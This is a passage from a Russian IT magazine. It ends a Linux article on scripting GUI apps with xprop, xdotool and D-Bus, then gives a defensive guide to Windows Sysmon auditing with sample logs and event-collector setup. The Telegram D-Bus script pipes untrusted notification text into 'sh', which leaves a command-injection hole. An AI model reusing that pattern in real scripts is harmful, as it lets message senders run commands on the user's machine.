для отображения свой ств окон и шрифтов. В некоторых моментах функци‐
ональность xprop пересекает ся с функциональностью других утилит. Нап‐
ример, чтобы определить активное окно, можно выполнить одну из сле‐
дующих команд:


$ xdotool getwindowname $(xdotool getactivewindow)
$ xwininfo ‐int ‐id $(xdotool getactivewindow) | awk ‐F\" '/
xwininfo:/ { print $2; exit }'
$ xwininfo ‐id $(xprop ‐root | awk '/NET_ACTIVE_WINDOW/ { print $5;
exit }') | awk ‐F\" '/xwininfo:/ { print $2; exit }'

Кроме того, xprop можно использовать, когда нужно изме нить свойства окон
или шрифтов. В одной  из прошлых  статей  я рассказывал про трюк
с эффектом размытия для полупрозрачного окна Yakuake. Тот же прием
для Konsole будет выглядеть так:


#!/bin/bash
if [ `echo $DISPLAY` ]; then
    konsolex=$(qdbus | grep konsole | cut ‐f 2 ‐d\ )
    if [ ‐n konsolex ]; then
        for konsole in $konsolex; do
            xprop ‐f _KDE_NET_WM_BLUR_BEHIND_REGION 32c ‐set _KDE_N
ET_WM_BLUR_BEHIND_REGION 0 ‐id `qdbus $konsole /konsole/MainWindow_1
winId`;
        done
    fi
fi


D-BUS
Практически любой современный десктопный дис трибутив Linux пос тавля‐
ется с системой межпроцес сного вза имо дей ствия D‐Bus. Многие приложе‐
ния используют D‐Bus для общения меж ду собой, ее же использует среда
KDE с версии 4. Для нас же важно то, что D‐Bus можно применить в качестве
посредника между пользователем и машиной, то есть для управления гра‐
фическими приложениями и их скриптования.
   Как пример исполь зования D‐Bus при веду скрипт, который мониторит уве‐
домления от Telegram и при наличии в сообщении определенного триггера —
имени контакта или клю чевой фразы — автомати чес ки откры вает приложение
для просмотра сооб щения. Чтобы реализовать этот замысел, можно при‐
совокупить к D‐Bus уже известный нам xdotool:


#!/bin/bash
contact="Николай"
dbus‐monitor "interface='org.freedesktop.Notifications'" |\
grep ‐‐line‐buffered "string" |\
grep ‐‐line‐buffered $contact |\
grep ‐‐line‐buffered ‐e method ‐e ":" ‐e '""' ‐e urgency ‐e notify
‐v |\
grep ‐‐line‐buffered '.*(?=string)|(?<=string).*' ‐oPi |\
grep ‐‐line‐buffered ‐v '^\s*$' |\
xargs ‐I '{}' echo {} |\
sed ‐u ‐n 's/'$contact'/xdotool mousemove 1096 66 sleep 1 click 1/p'
|\
sh

В качестве триггера здесь использовано имя контакта, как оно указано
в списке контактов. Фильтруя и редактируя новые сообщения в рамках
мониторинга D‐Bus, на выходе получа ем имя контакта в момент, когда от него
приходит сообщение, и подменяем его на модифицированную команду
из предыдущих примеров.
  По заранее вычисленным координатам скрипт перемещает курсор мыши
в ту область, где появляется окно нотифи кации, и секунду спус тя эму лирует
клик левой кнопки, тем самым заставляя «Телеграм» открываться с фокусом
на отправителе этого сообщения и самом сооб щении.


ВЫВОДЫ
Несмотря на то что графичес кий софт обычно предполагает управление
мышью  и  зачастую  весьма  огра ниченный набор комбинаций  клавиш,
широкие возможности Linux поз воляют соз давать сценарии даже в этом слу‐
чае.
  В статье перечислены далеко не все возможности консольных при ложе‐
ний по управлению прог рамма ми с графическим интерфейсом. Тут пред при‐
нята всего лишь попытка обозначить наиболее общие моменты, с помощью
которых каждый мог бы нас троить собс твенный инструментарий для выпол‐
нения своих уникальных задач.
SYNACK
SYSMON
 ДЛЯ БЕЗОПАСНИКА
     РАСШИРЯЕМ ВОЗМОЖНОСТИ
          АУДИТА СОБЫТИЙ
          С ПОМОЩЬЮ
       ТВОРЕНИЯ РУССИНОВИЧА





 Александр Кузнецов                                                         Алексей Федоров
   Microsoft MVP, CISM                                                             Сертифицированный
                                                                                  инженер IBM и RSA





Технические специалисты, которые, расследуя ИБ‐инциден‐
ты или устраняя неполадки при траблшутинге, хоть раз
пытались найти в логах операционных систем семейства Mi‐
crosoft Windows реально важную для них информацию, зна‐
ют, что в журналы аудита событий попадает далеко не все,
что нужно. Можно ли испра вить эту ситуацию без допол‐
нительных финансовых вложений с использованием инстру‐
ментов, гарантированно совместимых с Windows‐средой?
Разумеется, можно!


Сразу оговорим ся, что за рамками нас тоящей статьи останутся вопросы
осознанной чистки логов или «кривой» нас трой ки политик аудита в домене
(Audit Policy). Здесь мы поговорим только о том, как повысить информатив‐
ность и расширить возможности функции ауди та событий, используя утилиту
System Monitor (Sysmon) в Windows‐среде (от Windows 7 для клиентских узлов
и от Windows Server 2008 R2 для серверов).


SYSMON
Утилиту можно загрузить с веб‐сайта Microsoft Docs, из раз дела Windows Sys‐
internals. В составе Windows Sysinternals от Марка Руссиновича и Со есть
еще много полезных утилит, так что найди время и «пощупай» их. Плюс заг‐
ляни в подборку материалов на GitHub.
  Но для данной статьи мы возь мем специальную готовую сборку с GitHub,
вклю чающую файл конфигурации Sysmon Threat  Intelligence Conﬁguration
от ION‐STORM. Она ориентирована именно на выявление инцидентов ИБ
и может выступить качес твенной основой для соз дания твоих собственных
файлов конфигурации.
   Утилиту можно  установить точечно на каж дое рабочее место либо
с использованием групповых политик (Group Policy) в домене. В данном фай‐
ле конфигурации указываются в большинстве своем полные стандартные
пути для ряда программного обеспечения:


<Image condition="is">C:\Program Files\OpenVPN\bin\openvpn‐gui.exe</
Image>
<ImageLoaded condition="contains">C:\Program Files (x86)\Notepad++</
ImageLoaded>

Таким образом, в конкретной ИТ‐инфраструктуре это может потребовать
определенного тюнин га, так как, нап ример, согласно корпоративной полити‐
ке программы могут уста навливаться на диск D:\, а не на C:\. Инстру мен‐
тарий настолько гибкий, что можно задавать любые конструкции, нацеленные
на то, чтобы отслеживать определенные дей ствия или исключать их из твоего
поля зрения.
  После установки получишь новый журнал (Channel) Microsoft‐Windows‐Sys‐
mon/Operational, в котором Sysmon выделяет 18 категорий задач (Task Cate‐
gory), среди них: Process Create, Network Connect, Driver Load, ProcessAccess,
File Create.





АУДИТ СЕТЕВОГО ВЗАИМОДЕЙСТВИЯ
Перейдем к практическому применению Sysmon.
  Представь сетевое вза имодействие между дву мя узлами  сети: узел
А обращается к узлу Б, и это обра щение не является легальным, то есть воз‐
никает подозрение на ИБ‐инцидент. Искать следы данного сетевого взаимо‐
действия в операционной системе будут в самый последний момент, а начнут
именно с активного сетевого оборудования. Что нам скажет межсетевой
экран или маршрутизатор, если он контро лирует это сетевое взаимодей‐
ствие?


<190>%ASA‐6‐302014: Teardown TCP connection 2047052539 for outside:
IP_1/60307 (DOMAIN\USER_NAME) to dmz‐0:IP_2/22 duration 0:00:16
bytes 5675 TCP FINs (USER_NAME)

Видим только, кто IP_1 и куда IP_2. По большому счету тут потребуются
дополнительные усилия: придется в полуавтоматическом или ручном режиме
анализировать узел А  (IP_1),  чтобы найти реальный источник сетевой
активности. Необходимо помнить, что если сетевая активность не выходит
за пределы сегмента сети, контролируемого меж сетевым экраном, или на
данном межсетевом экра не на регистрируются соответствующие события,
что зачастую и бывает, то ничего найти в логах не получится.
  Предположим, тебе уда лось применить в этот момент еще и сниффер
или заблаговременно ответвить трафик через SPAN‐порт и сформировать
PCAP‐файл. Что это даст?





Мы видим, кто, куда и, если очень повезет, с помощью чего, то есть в данном
случае PuTTY. Но здесь нет ни места установки приложения, ни име ни
исполняемого файла, ни когда он был создан. В случае PuTTY это может
показаться надуманными атрибутами, но если ты ищешь следы несанкциони‐
рованных действий и/или вредоно са, то это уже важные вещи. Плюс вре‐
донос может «представиться» легальным приложением и подтолкнуть тебя
закрыть данный ИБ‐инцидент как ложное срабаты вание (false positive), приняв
решение только на основании полученного из дампа сетевого трафика име ни
приложения.
   Теперь посмотрим в канал Microsoft‐Windows‐Sysmon/Operational. В нем
есть следующее событие:


Network connection detected:
UtcTime: 2018‐02‐08 11:33:49.672
ProcessGuid: {4e1a728b‐358a‐5a7c‐0000‐00108901d000}
ProcessId: 4636
Image: C:\Users\USER_NAME\Desktop\putty.exe
User: DOMAIN\USER_NAME
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: IP_1
SourceHostname: COMP_NAME.DOMAIN
SourcePort: 60307
SourcePortName:
DestinationIsIpv6: false
DestinationIp: IP_2
DestinationHostname:
DestinationPort: 22
DestinationPortName: ssh

Видим, кто, куда, с помощью чего, а также дополнительные параметры
сетевого взаимодействия (протокол, порт). Теперь в этом же канале по зна‐
чению поля ProcessGuid найдем событие категории Process Create, чтобы
получить  больше информа ции  непос редс твенно об  источнике  данной
сетевой активности:


Process Create:
UtcTime: 2018‐02‐08 11:33:30.583
ProcessGuid: {4e1a728b‐358a‐5a7c‐0000‐00108901d000}
ProcessId: 4636
Image: C:\Users\USER_NAME\Desktop\putty.exe
CommandLine: "C:\Users\USER_NAME\Desktop\putty.exe"
CurrentDirectory: C:\Users\USER_NAME\Desktop\
User: DOMAIN\USER_NAME
LogonGuid: {4e1a728b‐268c‐5a7c‐0000‐0020d3a20600}
LogonId: 0x6A2D3
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes:     SHA256=7AFB56DD48565C3C9804F683C80EF47E5333F847F2
D3211EC11ED13AD36061E1,IMPHASH=EFE162FD3D51DED9DD66FA4AC219BF53
ParentProcessGuid: {4e1a728b‐268d‐5a7c‐0000‐001023de0600}
ParentProcessId: 3632
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE

Видим, что создан процесс, в том чис ле определено хеш‐значение фай‐
ла‐прародителя данного процесса. Теперь ты можешь по хешу проверить
этот файл:
 • по корпоративным «белым спискам» разрешенного программного обес‐
   печения;
 • на соответствие эталону на веб‐сайте про изво дителя данного програм‐
  много обеспечения;
 • в рейтингах сервиса Threat Intelligence;
 • на ресурсах типа VirusTotal.





      Стоит отме тить, что на тех узлах сети, где есть огра ниче ния на уста-
      нов ку средств антивирус ной защиты (тер миналы дис петче ров, тех-
      нологичес кие АРМ и тому подобное), ана лиз хешей — в том чис ле
      автоматизированный, путем сопос тавле ния данных от сер висов Threat
        Intelligence, нап ример в сис теме клас са Security Information and Event
      Management (SIEM), — может выс тупать вполне действенной ком-
      пенсирующей мерой для борьбы с вре донос ным програм мным обес-
      печением.

Развивая тематику отслежива ния действий, связанных с файлами, нужно
отметить, что по умол чанию ука занный файл конфигурации позволяет отсле‐
живать создание в операционной системе фай лов, которые могут быть
потенциальным источником ИБ‐инцидентов, например цифровых сертифика‐
тов, исполняемых файлов, файлов биб лиотек, PowerShell‐файлов, RDP‐фай‐
лов, файлов MS Oﬃce с поддержкой макросов, а также файлов, создаваемых
в определенных катало гах файловой системы:


File created:
UtcTime: 2018‐02‐08 11:50:39.893
ProcessGuid: {4e1a728b‐283b‐5a7c‐0000‐00107b384a00}
ProcessId: 2780
Image: C:\Program Files\Microsoft Office\Office15\WINWORD.EXE
TargetFilename: C:\Users\USER_NAME\Desktop\Doc1.docm
CreationUtcTime: 2018‐02‐08 11:50:39.893

Файлы или действия, которые ведут к изменению параметров реестра, также
подлежат протоколированию. Например, ассоциация типа файла DOCM,
который был впервые использован в операционной сис теме при создании
файла Doc1.docm (см. пример выше), с приложением MS Word:


Registry value set:
EventType: SetValue
UtcTime: 2018‐02‐08 11:50:40.550
ProcessGuid: {4e1a728b‐268d‐5a7c‐0000‐001023de0600}
ProcessId: 3632
Image: C:\Windows\Explorer.EXE
TargetObject: \REGISTRY\USER\S‐1‐5‐21‐1626002472‐1445367128‐358350
9536‐1113\Software\Microsoft\Windows\CurrentVersion\Explorer\
FileExts\.docm\OpenWithList\a
Details: WINWORD.EXE

Для безопасника это может представлять интерес, когда вредоносный файл
производит переассоциацию легально закрепленных корпоративных при‐
ложений для определенных типов файлов и тем самым «навязывает» исполь‐
зование уязвимого приложения. Еще при мер: изменение ключей реестра
операционной системы, влияющих на параметры загрузки операционной
системы, чтобы снизить уровень ее защищенности после очередной перезаг‐
рузки (отключение средств антивирус ной защиты или дру гих средств защиты
информации).


ЦЕНТРАЛИЗАЦИЯ СБОРА И ХРАНЕНИЯ СОБЫТИЙ
Чтобы обеспечить центра лизованный сбор и хра нение событий из логов всех
узлов сети, в том числе сократить злоумышленнику возможности очищать
логи на атакуемом узле, практику ется консолидация данных на выделенном
узле. На этом узле должна быть запущена служба Windows Event Collector.
В итоге события будут отображать ся в журнале Forwarded Events.
  Нужно сделать следующие шаги на каждом рабочем мес те либо с исполь‐
зованием групповых политик в домене:
 1. Добавить пользователя, от имени которо го будут собираться события
  «COLLECTOR», в локальную группу «Event log reader».
 2. Выполнить от имени администратора (Run as) команду


   winrm quickconfig ‐quiet

 3. Выполнить от имени администратора (Run as) команду


   wevtutil get‐log Microsoft‐Windows‐Sysmon/Operational

   и получить строку channelAccess: DATA.





 4. Выполнить от имени администратора (Run as) команду


   wmic useraccount where name='COLLECTOR' get sid

   и получить UID_COLLECTOR.
 5. Выполнить от имени администратора (Run as) команду


   wevtutil set‐log Microsoft‐Windows‐Sysmon/Operational /ca: DATA(A;
   ;0x1;;;UID_COLLECTOR)

   и получить расширенные права дос тупа к каналу Microsoft‐Windows‐Sys‐
   mon/Operational для учет ной записи COLLECTOR.


 6. Добавить дан ный узел в специально соз данную подписку (Subscription)
   для централизованного сбо ра и хранения событий на выделенном узле
   с запущенной службой Windows Event Collector.


ЗАКЛЮЧЕНИЕ
Наша практика показа ла, что для полноценного анализа подозрительных
событий в сети зачастую штатных средств ведения логов не хватает, особен‐
но если мы говорим о целевых атаках на орга низации. В данном случае Sys‐
mon может выступать высоко перспективным решением, возможности при‐
менения которого, на наш взгляд, будут ограничиваться только фантазией
конечного специалиста по защите информации.